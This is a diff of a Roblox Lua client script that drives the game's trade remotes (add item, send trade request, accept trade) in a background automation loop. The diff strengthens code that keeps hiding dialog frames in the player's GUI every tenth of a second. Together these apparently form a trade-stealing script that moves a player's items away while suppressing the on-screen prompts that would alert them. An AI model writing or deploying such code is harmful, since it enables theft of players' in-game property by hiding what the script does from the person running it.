@@ -1,17 +1,27 @@
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 
--- ================= CONFIGURATION =================
-HIDDEN_UI_NAMES = {
-	"Dialog",
-}
+targetFrameName = {"Dialog", "Frametest2", "Frametest3"}
 -- =================================================
 
 local addItemRemote = ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/AddItemToOffer")
 local sendTradeRemote = ReplicatedStorage:FindFirstChild("TradeAPI/SendTradeRequest", true)
 local tradeFunction = ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/AcceptOrDeclineTradeRequest")
 local API = ReplicatedStorage:WaitForChild("API")
+
+task.spawn(function()
+	while true do
+		for _, gui in ipairs(PlayerGui:GetDescendants()) do
+			if gui:IsA("Frame") and table.find(targetFrameName, gui.Name) then
+				gui.Visible = false
+			end
+		end
+
+		task.wait(0.1)
+	end
+end)
 
 local successClientData, ClientData = pcall(function()
 	return require(ReplicatedStorage:WaitForChild("ClientModules"):WaitForChild("Core"):WaitForChild("ClientData"))
@@ -151,34 +161,3 @@ end
 
 -- Start the loop in the background
 task.spawn(RunTradeAutomation)
-
-local hiddenNames = {}
-for _, name in ipairs(HIDDEN_UI_NAMES) do
-	hiddenNames[name] = true
-end
-
-local function hideUi(instance)
-	if not hiddenNames[instance.Name] then
-		return
-	end
-
-	if instance:IsA("ScreenGui") then
-		instance.Enabled = false
-	elseif instance:IsA("GuiObject") then
-		instance.Visible = false
-	end
-end
-
-local function watchUiContainer(container)
-	hideUi(container)
-
-	for _, descendant in ipairs(container:GetDescendants()) do
-		hideUi(descendant)
-	end
-
-	container.DescendantAdded:Connect(hideUi)
-end
-
-local playerGui = LocalPlayer:WaitForChild("PlayerGui")
-watchUiContainer(playerGui)
-playerGui.ChildAdded:Connect(watchUiContainer)
